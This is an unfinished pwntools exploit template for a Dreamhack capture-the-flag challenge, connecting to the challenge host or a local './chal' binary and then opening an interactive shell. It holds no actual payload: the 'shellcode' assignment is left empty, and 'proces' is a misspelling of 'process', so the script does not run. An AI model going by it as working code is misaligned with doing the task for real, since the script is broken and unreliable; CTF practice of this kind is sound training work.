from pwn import *

HOST, PORT = 'host8.dreamhack.games 1234'.split()

if args.REMOTE:
    p = remote(HOST, PORT)
else:
    p = proces('./chal')

shellcode =

p.interactive()
